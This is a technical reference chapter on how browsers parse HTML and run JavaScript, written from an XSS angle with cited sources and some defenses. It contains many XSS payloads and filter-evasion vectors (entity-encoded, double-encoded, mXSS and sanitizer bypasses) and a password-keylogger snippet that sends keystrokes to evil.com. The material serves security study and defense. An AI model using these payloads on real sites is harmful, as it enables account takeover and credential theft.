# 02 - Browser Parsing & Execution Model

## 1. HTML Parser Behavior: Tag Soup Parsing and Error Recovery

Modern browsers implement the **HTML5 parsing algorithm** defined in the WHATWG Living Standard. Unlike XML parsers, HTML parsers are designed to handle malformed, incomplete, and contradictory markup -- a legacy requirement often called "tag soup" parsing.

### Key Parser Properties for XSS Exploitation

**Permissive by design:** The HTML5 spec mandates specific error recovery behavior for every possible malformed input. There is no such thing as a "parse error that stops rendering." The browser will always attempt to construct a DOM tree, even from severely broken markup.

**Automatic tag closing:** Certain elements are automatically closed when specific other elements are encountered. For example, `<p>` is automatically closed by `<div>`, `<table>`, `<h1>`-`<h6>`, and many others. This means:

```html
<!-- What the developer writes -->
<p>Hello <div>World</div>

<!-- What the browser actually constructs -->
<p>Hello</p><div>World</div>

<!-- XSS implication: injecting <div> inside <p> breaks structure -->
<p>User input: <div onmouseover=alert(1)>hover me</div></p>
<!-- Becomes: <p>User input: </p><div onmouseover=alert(1)>hover me</div><p></p> -->
```

**Automatic tag insertion:** The parser inserts missing elements. A `<table>` without `<tbody>` gets one added automatically. An `<html>`, `<head>`, and `<body>` are created even if absent from the source.

**Character reference decoding:** HTML entities are decoded during tokenization. This enables entity-encoded payloads to bypass string-matching filters:

```html
<!-- Filter sees no "script" string, but browser decodes entities -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Click</a>

<!-- Decimal and hex entity encoding are both valid -->
<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
```

**Source:** [WHATWG HTML Living Standard - Parsing](https://html.spec.whatwg.org/multipage/parsing.html), [HTML Parsing and Processing](https://thelinuxcode.com/html-parsing-and-processing-how-browsers-turn-text-into-a-living-dom/)

## 2. Parser States and Transitions

The HTML5 tokenizer is a state machine with over **80 distinct states**. The current state determines how the next character of input is processed. Several states are security-critical because they control whether content is treated as markup or raw text.

### Security-Critical Tokenizer States

| State | Triggered By | Security Impact |
|-------|-------------|-----------------|
| **Data state** | Default; between tags | Characters form text nodes; `<` starts a new tag. XSS payloads in this state execute directly. |
| **RCDATA state** | `<textarea>`, `<title>` | Only character references and `</` (end tag) are recognized. Other tags are treated as text. Prevents most XSS but entity decoding still occurs. |
| **RAWTEXT state** | `<style>`, `<xmp>`, `<iframe>`, `<noembed>`, `<noframes>` | No character references or tags are recognized except the matching end tag. Content is raw text. |
| **Script data state** | `<script>` | Similar to RAWTEXT but with special handling for `</script>` and `<!--`. Critical for understanding how to break out of inline script blocks. |
| **PLAINTEXT state** | `<plaintext>` | Nothing is recognized as markup. There is no way to exit this state. Once entered, everything until EOF is plain text. |

### State Transition Exploitation

**RCDATA breakout (title/textarea):**
```html
<!-- Inside <title>, tags are text, not markup -->
<title>USER_INPUT</title>

<!-- Attacker injects the closing tag to escape RCDATA state -->
<title></title><script>alert(1)</script></title>

<!-- The parser sees </title>, exits RCDATA, enters Data state,
     then parses the <script> tag normally -->
```

**Namespace-driven state changes:**
When the parser encounters `<svg>` or `<math>` elements, it switches to foreign content parsing mode. Within SVG/MathML namespaces, different parsing rules apply, which can be exploited for sanitizer bypass:

```html
<!-- SVG namespace switches to foreign content mode -->
<svg><title>safe text here</title></svg>

<!-- But foreignObject inside SVG switches BACK to HTML namespace -->
<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>

<!-- This namespace ping-pong is the basis for many mXSS attacks -->
```

**Source:** [WHATWG - Tokenization](https://html.spec.whatwg.org/multipage/parsing.html#tokenization), [Browser from Scratch: HTML Parsing](https://viethung.space/blog/2020/10/24/Browser-from-Scratch-HTML-parsing/)

## 3. How Browsers Handle Malformed HTML

Browsers implement **adoption agency algorithm** and **foster parenting** to handle mismatched and misnested tags:

### Adoption Agency Algorithm
Handles misnested formatting elements. When a formatting element (like `<b>`, `<i>`, `<a>`) is improperly nested, the browser reconstructs the tree to maintain visual expectations:

```html
<!-- Source HTML -->
<b>bold <i>bold-italic</b> italic?</i>

<!-- Browser reconstructed DOM -->
<b>bold <i>bold-italic</i></b><i> italic?</i>
```

### Foster Parenting
When the parser encounters content inside `<table>` that is not valid table content, it "foster parents" the content -- placing it before the table in the DOM:

```html
<!-- Source HTML -->
<table><div>foster parented content</div><tr><td>cell</td></tr></table>

<!-- Browser DOM result -->
<div>foster parented content</div>
<table><tbody><tr><td>cell</td></tr></tbody></table>

<!-- XSS implication: injected content inside table gets moved outside -->
<table><img src=x onerror=alert(1)><tr><td>data</td></tr></table>
<!-- The img is foster-parented BEFORE the table and executes -->
```

### Null Byte Handling
Different browsers handle null bytes (`\x00`) differently, which can be exploited to bypass filters:

```html
<!-- Null byte in tag name -- some parsers ignore it, others don't -->
<scr\x00ipt>alert(1)</script>

<!-- Null byte in attribute value -->
<img src=x onerror=al\x00ert(1)>
```

**Source:** [WHATWG - Tree Construction](https://dev.w3.org/html5/spec-LC/tree-construction.html), [LEXSS: Bypassing Lexical Parsing Security Controls](https://bishopfox.com/blog/lexss-bypassing-lexical-parsing-security-controls)

## 4. Encoding Priority: HTML Entity, URL, JavaScript

The browser applies different decoding layers depending on the parsing context. Understanding the decoding order is critical for crafting payloads that survive multiple encoding/decoding passes.

### Triple-Layer Decoding Model

```
┌─────────────────────────────────────────────────────────┐
│  LAYER 1: HTML Entity Decoding                          │
│  Applied when: Parser processes attribute values and     │
│  text content                                           │
│  Decodes: &amp; -> &, &#60; -> <, &#x3c; -> <          │
├─────────────────────────────────────────────────────────┤
│  LAYER 2: URL Decoding                                  │
│  Applied when: Browser processes URL-type attributes     │
│  (href, src, action, formaction)                        │
│  Decodes: %3C -> <, %22 -> "                            │
├─────────────────────────────────────────────────────────┤
│  LAYER 3: JavaScript Decoding                           │
│  Applied when: JavaScript engine processes string        │
│  literals in script contexts                            │
│  Decodes: \x3C -> <, \u003c -> <, \074 -> <            │
└─────────────────────────────────────────────────────────┘
```

### Decoding Order by Context

**In an href attribute with javascript: URL:**
1. HTML entity decoding (attribute value processing)
2. URL decoding (href is a URL attribute)
3. JavaScript decoding (javascript: scheme triggers JS engine)

```html
<!-- All three layers applied in sequence -->
<!-- Step 1: HTML entities decoded: &#106;&#97;... -> javascript: -->
<!-- Step 2: URL decoding: %61%6c... -> alert -->
<!-- Step 3: JavaScript execution -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;%61%6c%65%72%74(1)">XSS</a>
```

**In an event handler attribute:**
1. HTML entity decoding (attribute value)
2. JavaScript decoding (event handlers are JS contexts)

```html
<!-- HTML entities decoded first, then JS executes the result -->
<div onclick="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</div>
<!-- Decoded to: <div onclick="alert(1)">click</div> -->
```

**In a script block:**
1. Only JavaScript decoding (no HTML entity decoding inside <script>)

```html
<script>
// HTML entities are NOT decoded inside <script> tags
var x = "&#60;img&#62;";  // This is the literal string "&#60;img&#62;"
// NOT the string "<img>"

// But JavaScript escape sequences ARE decoded
var y = "\x3Cimg\x3E";   // This IS the string "<img>"
</script>
```

### Double Encoding Bypass

When a server-side filter decodes input once before checking it, but the backend/browser decodes it again:

```
Original:    <script>alert(1)</script>
URL-encoded: %3Cscript%3Ealert(1)%3C/script%3E      <- filter catches this
Double-enc:  %253Cscript%253Ealert(1)%253C/script%253E  <- filter sees %3C (safe)
                                                         <- server decodes to <script> (XSS)
```

**Source:** [PortSwigger - Obfuscating Attacks Using Encodings](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings), [Sonarsource - Encoding Differentials](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/), [OWASP - Double Encoding](https://owasp.org/www-community/Double_Encoding)

## 5. JavaScript Execution Contexts

### Inline Scripts
Execute synchronously during HTML parsing. The parser pauses, the script executes, and parsing resumes. This is why `document.write()` can inject new HTML that becomes part of the page.

```html
<script>
  // Executes immediately during parsing
  // Can modify the document being parsed
  document.write('<img src=x onerror=alert(1)>');
</script>
```

### External Scripts
By default, external scripts also block parsing (synchronous loading). The `defer` and `async` attributes change this behavior:

```html
<!-- Blocks parsing until loaded and executed -->
<script src="app.js"></script>

<!-- Downloads in parallel, executes after parsing complete (in order) -->
<script defer src="app.js"></script>

<!-- Downloads in parallel, executes immediately when ready (any order) -->
<script async src="app.js"></script>
```

### Event Handlers
JavaScript in HTML event handler attributes (onclick, onload, onerror, onfocus, etc.) is compiled and stored, then executed when the corresponding event fires:

```html
<!-- Compiled during parsing, executed on click -->
<button onclick="alert(1)">Click</button>

<!-- Auto-triggering event handlers -- no user interaction required -->
<img src=x onerror=alert(1)>               <!-- fires on load error -->
<svg onload=alert(1)>                       <!-- fires when SVG loads -->
<body onload=alert(1)>                      <!-- fires when body loads -->
<input autofocus onfocus=alert(1)>          <!-- fires on auto-focus -->
<details open ontoggle=alert(1)>            <!-- fires on toggle -->
<marquee onstart=alert(1)>                  <!-- fires on animation start -->
<video><source onerror=alert(1)>            <!-- fires on source error -->
```

### javascript: URLs
The `javascript:` pseudo-protocol executes JavaScript when the URL is navigated to:

```html
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><button>Submit</button></form>
<object data="javascript:alert(1)">
```

**Source:** [PortSwigger - Cross-Site Scripting Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## 6. Dangerous Sink Functions

These JavaScript functions and DOM properties will execute attacker-controlled strings as code or markup:

### Code Execution Sinks

```javascript
// Direct code execution -- highest severity
window.eval('attacker_string');           // Executes as JavaScript
new Function('attacker_string')();         // Creates and executes function
window.setTimeout('attacker_string', 0);   // Executes string as JS after delay
window.setInterval('attacker_string', 0);  // Executes string as JS repeatedly

// Note: setTimeout/setInterval are only sinks when passed a STRING.
// Passing a function reference is safe:
setTimeout(myFunc, 0);  // SAFE
setTimeout('alert(1)', 0);  // DANGEROUS
```

### HTML Injection Sinks

```javascript
// DOM manipulation that parses HTML strings
element.innerHTML = 'attacker_string';          // Parses as HTML
element.outerHTML = 'attacker_string';          // Replaces element with parsed HTML
element.insertAdjacentHTML('beforeend', 'str'); // Inserts parsed HTML
document.write('attacker_string');              // Writes to document during parsing
document.writeln('attacker_string');            // Same as write() + newline

// jQuery equivalents (extremely common in legacy applications)
$(element).html('attacker_string');    // jQuery wrapper for innerHTML
$(element).append('attacker_string');  // Parses and appends HTML
$(element).prepend('attacker_string'); // Parses and prepends HTML
$(element).after('attacker_string');   // Parses and inserts after element
$(element).before('attacker_string');  // Parses and inserts before element
$('attacker_string');                  // jQuery selector parses HTML if string starts with <
```

### URL/Navigation Sinks

```javascript
// URL-based sinks that can trigger javascript: execution
window.location = 'javascript:alert(1)';
window.location.href = 'javascript:alert(1)';
window.location.assign('javascript:alert(1)');
window.location.replace('javascript:alert(1)');
window.open('javascript:alert(1)');

// Element attribute manipulation
element.setAttribute('href', 'javascript:alert(1)');
element.setAttribute('src', 'javascript:alert(1)');
element.href = 'javascript:alert(1)';
```

### Safe Alternatives

```javascript
// SAFE: Use textContent instead of innerHTML for text-only insertion
element.textContent = userInput;  // Treats input as text, not HTML

// SAFE: Use createElement + textContent for structured content
const div = document.createElement('div');
div.textContent = userInput;
parentElement.appendChild(div);

// SAFE: Use URL validation for href attributes
const url = new URL(userInput, window.location.origin);
if (url.protocol === 'https:' || url.protocol === 'http:') {
    element.href = url.toString();
}
```

**Source:** [OWASP - DOM Based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html), [Invicti - DOM-Based XSS](https://www.invicti.com/learn/dom-based-cross-site-scripting-dom-xss)

## 7. DOM Construction: Tree Building and Script Execution Timing

### The Parsing Pipeline

```
Byte Stream
    |
    v
[Character Encoding Detection] -- BOM > HTTP header > meta tag
    |
    v
[Input Stream Preprocessing] -- normalize newlines, handle nulls
    |
    v
[Tokenizer] -- state machine producing tokens
    |
    v
[Tree Constructor] -- builds DOM tree from tokens
    |
    v
[DOM Tree] -- live, mutable document structure
```

### Script Execution During Parsing

When the tree constructor encounters a `<script>` element:

1. Parser increments the **script nesting level**
2. The **insertion point** is set (where `document.write()` output goes)
3. Script is **prepared**: src fetched (if external), content compiled
4. Script **executes** -- this may call `document.write()`, which feeds new characters back into the tokenizer (reentrant parsing)
5. Parser decrements the script nesting level
6. If the **parser pause flag** is set, nested tokenizer invocations abort

```html
<!-- Script execution is synchronous by default -->
<div id="before">Parsed first</div>
<script>
  // Executes NOW during parsing
  // document.getElementById('before') works -- it's already parsed
  // document.getElementById('after') returns null -- not parsed yet
  console.log(document.getElementById('before'));  // <div id="before">
  console.log(document.getElementById('after'));   // null
</script>
<div id="after">Parsed second</div>
```

### document.write() During Parsing

`document.write()` inserts characters into the input stream at the current insertion point. This is particularly dangerous because:

```html
<script>
  // This injects HTML that is parsed as part of the current document
  document.write('<img src=x onerror=alert(1)>');
  // The HTML parser processes this as if it were in the original source
</script>

<!-- After document is fully parsed (DOMContentLoaded), document.write()
     clears the entire document and starts fresh -->
<button onclick="document.write('<h1>Document destroyed</h1>')">Danger</button>
```

**Source:** [WHATWG - Parsing HTML Documents](https://html.spec.whatwg.org/multipage/parsing.html), [Lexbor - HTML Parsing](https://lexbor.com/articles/html/)

## 8. Mutation Observers and DOM Manipulation Timing

### MutationObserver for XSS Detection and Exploitation

MutationObservers can detect DOM changes asynchronously. From an attacker's perspective, they enable:

```javascript
// Attacker uses MutationObserver to detect when target element appears
const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        for (const node of mutation.addedNodes) {
            if (node.querySelector && node.querySelector('input[type="password"]')) {
                // Keylog the password field
                const pwField = node.querySelector('input[type="password"]');
                pwField.addEventListener('input', (e) => {
                    navigator.sendBeacon('https://evil.com/log', e.target.value);
                });
            }
        }
    }
});
observer.observe(document.body, { childList: true, subtree: true });
```

### Timing-Based DOM Manipulation

The microtask queue and macrotask queue ordering affects when injected scripts execute relative to DOM mutations:

```javascript
// Microtasks (Promises) execute before the next render
// Macrotasks (setTimeout) execute after the current task completes

// This ordering matters for race conditions in sanitization:
element.innerHTML = userInput;  // DOM updated synchronously
// Sanitizer runs here via MutationObserver (microtask)
// But if attacker's payload already triggered onerror, it's too late
```

**Source:** [MDN - MutationObserver](https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver)

## 9. Shadow DOM Security Boundaries

### What Shadow DOM Provides

Shadow DOM encapsulates DOM subtrees, creating a boundary between the "light DOM" (main document) and the "shadow DOM" (component internal structure). Key properties:

- Internal elements are hidden from `document.querySelector()` and `document.getElementById()`
- CSS styles are scoped (do not leak in or out by default)
- Event retargeting makes events appear to originate from the host element

### What Shadow DOM Does NOT Provide

**Shadow DOM is not a security boundary:**

```javascript
// Shadow DOM content IS accessible via the shadowRoot property
const host = document.querySelector('my-component');
const shadow = host.shadowRoot;  // null only if mode: 'closed'

// Even 'closed' shadow roots can be bypassed:
// 1. Override Element.prototype.attachShadow to capture the shadowRoot
const originalAttachShadow = Element.prototype.attachShadow;
Element.prototype.attachShadow = function(init) {
    const shadow = originalAttachShadow.call(this, init);
    window.__capturedShadows = window.__capturedShadows || [];
    window.__capturedShadows.push(shadow);
    return shadow;
};

// 2. Scripts inside shadow DOM have full access to the main document
// Shadow DOM does NOT restrict JavaScript execution scope
```

### Declarative Shadow DOM and Parsing

The `<template shadowrootmode="open">` syntax creates shadow roots during HTML parsing:

```html
<my-component>
  <template shadowrootmode="open">
    <style>:host { color: red; }</style>
    <slot></slot>
  </template>
  <p>Light DOM content</p>
</my-component>

<!-- Security consideration: innerHTML does NOT parse declarative shadow DOM -->
<!-- element.innerHTML = '<template shadowrootmode="open">...' creates a -->
<!-- regular <template> element, NOT a shadow root -->
<!-- This is an intentional security measure to prevent XSS via shadow DOM -->
```

**Source:** [Shadow DOM & Security - Masato Kinugawa](https://speakerdeck.com/masatokinugawa/shadow-dom-and-security-exploring-the-boundary-between-light-and-shadow), [Imperva - Shadow DOM](https://www.imperva.com/learn/application-security/shadow-dom/), [MDN - ShadowRoot](https://developer.mozilla.org/en-US/docs/Web/API/ShadowRoot)

## 10. Template Element Special Parsing Rules

The `<template>` element has unique parsing behavior that is security-relevant:

### How Template Parsing Differs

```html
<!-- Content inside <template> is parsed but NOT rendered or executed -->
<template>
  <script>alert('This does NOT execute')</script>
  <img src=x onerror="alert('This also does NOT execute')">
</template>

<!-- The content exists in a DocumentFragment, not the main DOM -->
<!-- It only becomes "live" when explicitly cloned and inserted: -->
<script>
  const template = document.querySelector('template');
  const clone = template.content.cloneNode(true);
  document.body.appendChild(clone);  // NOW the script executes
</script>
```

### Template and innerHTML Security

```html
<!-- Setting innerHTML creates template elements safely -->
<div id="target"></div>
<script>
  // The template content is parsed into an inert DocumentFragment
  document.getElementById('target').innerHTML =
    '<template><script>alert(1)<\/script></template>';
  // The script does NOT execute -- it's inside the template's DocumentFragment
</script>

<!-- However, non-template content in innerHTML DOES execute: -->
<script>
  document.getElementById('target').innerHTML =
    '<img src=x onerror=alert(1)>';
  // This DOES execute because onerror fires when the img fails to load
</script>
```

### Sanitizer Implications

Template elements create a parsing context that sanitizers must handle carefully. Content parsed as template children goes into an inert document fragment, but if the sanitizer serializes and re-parses, the template boundary may be lost.

**Source:** [WHATWG DOM Issue #912 - Declarative Shadow DOM Fragment Parsing](https://github.com/whatwg/dom/issues/912)

## 11. Content-Type and MIME Sniffing

### How MIME Sniffing Enables XSS

When a server sends a response without a proper `Content-Type` header (or with a generic type like `application/octet-stream`), browsers attempt to determine the content type by examining the response body. This **MIME sniffing** can turn non-HTML files into executable HTML:

```
# Attacker uploads a file with .jpg extension but HTML content:
# Content: <html><body><script>alert(document.domain)</script></body></html>

# If the server serves it without proper Content-Type:
HTTP/1.1 200 OK
Content-Type: application/octet-stream  (or missing entirely)

# Browser MIME-sniffs the content, detects HTML, renders it as a page
# Result: XSS in the context of the serving domain
```

### MIME Sniffing Algorithm

Browsers follow a defined algorithm (documented in the WHATWG MIME Sniffing Standard):

1. Check the first bytes of the response for **magic bytes/signatures**
2. Look for HTML signatures: `<!DOCTYPE`, `<html`, `<head`, `<script`, `<body`, `<br`, `<p`, `<!--`, `<table`, `<a href`, `<title`
3. Check for XML signatures: `<?xml`
4. Check for image signatures: PNG (\x89PNG), JPEG (\xFF\xD8\xFF), GIF (GIF8)
5. If content looks like HTML, render as HTML (enabling XSS)

### X-Content-Type-Options: nosniff

The definitive defense against MIME sniffing attacks:

```
HTTP/1.1 200 OK
Content-Type: image/jpeg
X-Content-Type-Options: nosniff

# With nosniff, the browser will:
# - Block script loading if Content-Type is not a valid JavaScript MIME type
# - Block stylesheet loading if Content-Type is not text/css
# - NOT sniff the content to override the declared type
```

**Behavior without nosniff:**
- A file served as `text/plain` containing `<script>alert(1)</script>` may be sniffed as HTML
- A file served as `image/jpeg` containing HTML may be rendered as a web page
- User-uploaded content on the same origin can achieve XSS

**Behavior with nosniff:**
- Content-Type is strictly enforced
- Scripts must be served with a valid JavaScript MIME type (`text/javascript`, `application/javascript`, etc.)
- Stylesheets must be served as `text/css`

### Content-Type Exploitation Scenarios

```
# Scenario 1: JSON endpoint without proper Content-Type
GET /api/user?callback=<script>alert(1)</script>
Response: <script>alert(1)</script>({"name":"test"})
Content-Type: text/html  (misconfigured)
# Result: Browser renders the response as HTML

# Scenario 2: File upload without Content-Type enforcement
POST /upload (file.html disguised as file.jpg)
GET /uploads/file.jpg
Content-Type: (missing or application/octet-stream)
# Result: Browser sniffs HTML, executes scripts

# Scenario 3: SVG file upload
POST /upload (malicious.svg containing <script>alert(1)</script>)
GET /uploads/malicious.svg
Content-Type: image/svg+xml
# Result: SVG with embedded JavaScript executes in the origin context
```

### Browser MIME Type Enforcement Summary

| Scenario | Without nosniff | With nosniff |
|----------|----------------|--------------|
| HTML content served as text/plain | May render as HTML | Rendered as plain text |
| Script loaded with wrong Content-Type | Script executes | Script blocked |
| CSS loaded with wrong Content-Type | Stylesheet applied | Stylesheet blocked |
| SVG with JavaScript served as image/svg+xml | JavaScript executes | JavaScript executes (correct type) |
| HTML in uploaded file served as application/octet-stream | Sniffed and rendered as HTML | Not rendered as HTML |

**Source:** [Coalfire - MIME Sniffing in Browsers](https://coalfire.com/the-coalfire-blog/mime-sniffing-in-browsers-and-the-security), [Beyond XSS - Exploiting MIME Sniffing](https://aszx87410.github.io/beyond-xss/en/ch5/mime-sniffing/), [MDN - MIME Type Verification](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/MIME_types)

## 12. Parser Differential Attacks

The fundamental technique behind mXSS and sanitizer bypasses: different parsers (sanitizer vs. browser) produce different DOM trees from the same input.

### Why Parsers Differ

1. **DOMParser vs. innerHTML vs. document.write():** These use different parsing contexts (XML vs. fragment vs. document parsing), leading to different results for the same input string.

2. **Namespace handling:** HTML, SVG, and MathML have different namespace rules. A sanitizer using a non-browser parser may not correctly handle namespace transitions.

3. **Comment handling quirks:** The empty comment `<!-->` is valid per HTML5 spec, but some parsers (e.g., BeautifulSoup) treat it differently, enabling XSS bypass.

```html
<!-- BeautifulSoup sees <!> as a comment -->
<!-- Browser sees <!> as a bogus comment and continues parsing normally -->
<!-- Discrepancy enables sanitizer bypass -->
<img src=x <!> onerror=alert(1)>
```

### Practical Parser Differential Examples

```html
<!-- Sanitizer parses <title> content as RCDATA (no tags) -->
<!-- But if the sanitizer doesn't handle SVG's <title> correctly: -->
<svg><title><img src=x onerror=alert(1)></title></svg>
<!-- In SVG context, <title> may have different parsing rules than HTML <title> -->

<!-- noscript parsing differs based on whether scripting is enabled: -->
<!-- With scripting enabled (browser): <noscript> content is raw text -->
<!-- With scripting disabled (some sanitizers): <noscript> content is parsed as HTML -->
<noscript><img src=x onerror=alert(1)></noscript>
<!-- Sanitizer may see and try to sanitize the img tag -->
<!-- Browser with JS enabled treats entire content as raw text (safe) -->
<!-- But if the sanitizer REMOVES <noscript>, the img tag becomes active -->
```

**Source:** [GreHack 2024 - Playing with HTML Parsing to Bypass DOMPurify](https://slides.com/kevin-mizu/grehack-2024-playing-with-html-parsing-to-bypass-dompurify-on-default-configuration), [Jorian Woltjer - Mutation XSS](https://jorianwoltjer.com/blog/p/hacking/mutation-xss), [Mozilla Bug 1615315 - Bleach mXSS in noscript](https://bugzilla.mozilla.org/show_bug.cgi?id=1615315)

## 13. Comprehensive Reference: XSS-Relevant Browser Behaviors

| Browser Behavior | XSS Relevance | Example |
|-----------------|---------------|---------|
| Tag soup error recovery | Broken markup still renders, enabling partial payload execution | `<img src=x onerror=alert(1)` (missing `>`) still executes |
| Automatic attribute quoting | Unquoted attributes allow injection of new attributes | `<input value=a onfocus=alert(1) autofocus>` |
| Entity decoding in attributes | Encoded payloads bypass string filters | `<a href="&#106;avascript:alert(1)">` |
| Foster parenting | Content injected into tables appears outside the table | `<table><script>alert(1)</script></table>` |
| Namespace switching | SVG/MathML create different parsing contexts | `<math><mtext><img src=x onerror=alert(1)>` |
| MIME sniffing | Non-HTML files rendered as HTML | HTML content in .txt file executed |
| Case insensitivity | Mixed case bypasses naive filters | `<ScRiPt>alert(1)</ScRiPt>` |
| Whitespace tolerance | Unusual whitespace accepted in tags | `<img/src=x/onerror=alert(1)>` (/ as whitespace) |
| Null byte tolerance | Null bytes ignored in some contexts | `<scr\x00ipt>alert(1)</script>` |
| Comment variations | Different comment syntaxes handled | `<!--><img src=x onerror=alert(1)>-->` |

**Source:** [OWASP - XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html), [HackTricks - XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
